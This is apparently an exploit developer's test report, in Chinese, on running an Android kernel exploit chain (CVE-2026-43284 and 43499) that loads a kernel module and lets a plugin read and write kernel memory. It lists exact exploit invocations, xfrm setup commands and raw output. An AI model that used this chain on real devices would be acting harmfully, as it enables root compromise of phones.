# δ-4 端到端：**插件 → `glk_contract_ops` → LKM 通道** 真机门禁 — **PASS**（2026-10-05）

首次证明「插件真的经通道调用了 LKM」：载入一个**真实 `.so` 插件**，在 LKM 驻留窗口内经 `glk_contract_ops`
完成内核读/写，并验证越界地址被内核拒绝。

## 制品

| 制品 | 说明 |
|---|---|
| native `7751550`（δ-4） | `plugin/host_ops.*` 导出 + 窗口内 `POST_TERMINAL` 同步派发 + fail-soft |
| `ghostlock-android13-5.15.ko` 23512 B | δ-3 常驻通道 + `chmod/chcon` 脚本 |
| `tools/plugins/glk_probe.so` 6824 B，sha256 `180f24a5…` | 真插件：`read_u64` / `read_bytes` / 幂等 `write_bytes` / 越界读 |

## 命令

```sh
# 冷启后 su 尚不存在，先用 43499 取证（提权本身不需要 root），再用 su 建试验台
adb shell 'cd /data/local/tmp && GHOSTLOCK_HOME=/data/local/tmp ./glk-43499 \
  --load-prebuilt-profile /data/local/tmp/profile-43499.bin'
su -c "ip xfrm state add … spi 0x4a1f0011 … encap espinudp 4500 4500 0.0.0.0"
su -c 'setsid /data/local/tmp/espencap 4500 </dev/null >/dev/null 2>&1 &'
# 端到端（dev/gate-only：--plugin 仅与 --run-cve-2026-43284 同用）
adb shell 'cd /data/local/tmp && GHOSTLOCK_HOME=/data/local/tmp ./glk-d4 \
  --run-cve-2026-43284 /data/local/tmp/helper.ko /vendor/lib64/libbinderdebug.so \
  --stage=full --plugin /data/local/tmp/glk_probe.so < /data/local/tmp/frame.bin'
```

## 原始证据

```
[countermeasure] plugin log(1): glk.probe stage=4 va=0xffffff802ac43400 val=0x8 \
    read=0 bytes=0 write=0 bad_rejected=1
lkm_window opened=1 closed=1 calls=4 abi_version=1 unload_ok=1
run.countermeasure registry offered=1 registered=1 rejected=0 hooks=1 failures=0 skipped=0
run.countermeasure module name=glk.probe version=1.0 accepted=1 hooks=1
GLK_STATUS run.chain written=1470 verified=1470 rolled_back=0 cleanup=1 crash_dump=1 hook=1 hook_restored=1
GLK_STATUS run.trigger fired=1 wait_incomplete=0
GLK_STATUS run.wait outcome=LkmLoaded terminus=1 error=None
GLK_STATUS run.cve_2026_43284 ok error=None
```

**事后**：`ghostlock=0`、`/dev/glk` 不存在、`Enforcing`；dmesg `resident window closed (calls=5 reason=explicit)`；
AVB `ok=12 fail=0 sig_ok=5` → **`AVB_VERIFY=OK`**。

## 判读

1. **`calls=4 > 0` 是直接证据**：链自身的 `open(PING)` / `close(UNLOAD)` **不计入** `calls`，只有 `read/write/write_zero/direct_map` 才计；
   而基础链（无插件）此前读数为 `calls=0`。因此 `calls=4` 只能来自插件经通道发出的原语；
2. **越界被拒**（`bad_rejected=1`）：内核侧的 direct-map 地址校验对插件调用同样生效（地址合法性 ≠ 授权）；
3. **插件读到真值**：`va=0xffffff802ac43400`（`init_task` 别名）`val=0x8`，`read_bytes` 与幂等 `write_bytes` 均 `rc=0`；
4. **attached 不破坏攻击**：`run.cve_2026_43284 ok error=None`、`failures=0`；
5. **窗口生命周期不变**：`closed=1 unload_ok=1`、节点消失、模块 0、SELinux 恢复。

## 失败语义（本轮裁决，已实现）

对策设施**fail-soft**：窗口打不开或窗口体失败 → 记 `ChainResult::lkm_window_failed` 并**继续攻击**（插件观察到 `Unsupported`）；
`LkmWindowFailed` 不再作为中止原因。窗口本身的创建/关闭仍严格由链的 `finish()` 保证（无泄漏）。

## 说明

- 冷启后 `su` 不存在（KernelSU 未加载），故门禁需先跑一次 43499 取证；随后 43284 门禁在「KernelSU 已加载」状态下执行
  （脚本有 already-loaded 分支，链终点判据不受影响）。
- `--plugin` 是 **dev/gate-only** 开关：仅与 `--run-cve-2026-43284` 同用，不进 profile、不进生产路径；
  插件须 `chmod 644`（loader 拒绝组/其他可写）。
